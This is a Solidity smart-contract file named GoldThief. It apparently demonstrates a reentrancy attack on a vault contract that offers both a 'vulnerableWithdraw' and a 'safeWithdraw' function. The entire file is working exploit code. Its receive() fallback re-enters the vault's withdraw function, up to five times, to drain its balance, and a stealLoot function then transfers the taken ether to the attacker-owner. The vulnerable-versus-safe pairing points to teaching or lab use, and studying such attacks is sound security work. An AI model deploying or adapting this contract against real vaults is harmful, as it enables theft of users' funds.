//SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    address public owner;
    IVault public targetVault;
    uint256 public withdrawCount;
    bool public isSafeWithdraw;

    constructor(address _vaultAddress) {
        owner = msg.sender;
        targetVault = IVault(_vaultAddress);
    }

    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only the owner can perform this action");
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");

        withdrawCount = 0;
        isSafeWithdraw = false;
        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable {
        require(msg.sender == owner, "Only the owner can perform this action");
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");

        withdrawCount = 0;
        isSafeWithdraw = true;
        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable {
        withdrawCount++;
        if (!isSafeWithdraw && withdrawCount < 5 && address(targetVault).balance >=1) {
            targetVault.vulnerableWithdraw();
        }
        if (isSafeWithdraw) {
            targetVault.safeWithdraw();
        }
    }

    function stealLoot() external {
        require(msg.sender == owner, "Only the owner can perform this action");

        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }

    function depositTest() external payable {
        require(msg.sender == owner, "Only the owner can perform this action");
        require(msg.value >= 1 ether, "Need at least 1 ether");

        targetVault.deposit{value: msg.value}();
    }
}